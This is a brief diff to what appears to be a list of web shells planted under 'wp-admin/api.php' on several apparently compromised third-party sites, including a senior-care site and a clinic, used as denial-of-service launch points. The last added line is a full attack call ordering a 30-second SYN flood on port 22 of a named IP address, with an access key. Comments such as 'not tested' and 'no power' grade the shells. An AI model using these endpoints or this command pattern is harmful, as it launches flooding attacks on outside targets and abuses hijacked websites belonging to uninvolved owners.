@@ -9,5 +9,9 @@ https://cokato-senior-care.org/wp-admin/api.php
 https://clinicapequenosanjos.com.br/wp-admin/api.php
 http://casinonextyear19.com/wp-admin/api.php
 https://hwvps151469.hostwindsdns.com/wp-admin/api.php
+-- not tested
 https://pile-ca.fr/wp-admin/api.php
 https://e-pacientes.com.br/wp-admin/api.php
+
+
+https://auroravlsi.com/wp-admin/api.php?host=23.227.146.106&port=22&key=etherealhehe&time=30&method=syn -- no power
